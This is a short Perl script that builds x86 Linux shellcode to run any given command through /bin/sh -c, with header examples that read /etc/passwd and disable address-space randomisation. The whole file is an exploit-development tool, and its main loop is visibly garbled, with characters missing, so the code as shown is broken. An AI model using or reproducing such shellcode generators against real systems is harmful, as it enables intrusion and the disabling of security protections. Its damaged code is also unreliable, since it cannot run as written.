#!/usr/bin/perl
# ***************************************************************************
# Syntax:  generate_oneline_shellcode "";
# Example: generate_oneline_shellcode.pl "cat /etc/passwd"
# Example: generate_oneline_shellcode.pl "echo 0 > /proc/sys/kernel/randomize_va_space"
# Description: Generates shell code and execute the line via \bin\sh 
# Tested on: Ubuntu and DMV.
# ***************************************************************************

$input = reverse($ARGV[0]);
$shellcode="";

while((length($input) % 4) > 0)
{
	$input = " " . $input;
}

$row = "";

for ($key=0; $key  0)) 
	{
			$row = "\\x68" . $row;
			$shellcode =  $shellcode . $row;
			$row = "";
	}
}
print "\n\\x6a\\x0b\\x58\\x99\\x52\n";
print $shellcode;
print "\\x89\\xe6\\x52\\x66\\x68\\x2d\\x63\\x89\\xe1\\x52\x68\\x2f\\x2f\\x73\\x68\n";
print "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x56\\x51\\x53\\x89\\xe1\\xcd\\x80\n\n";

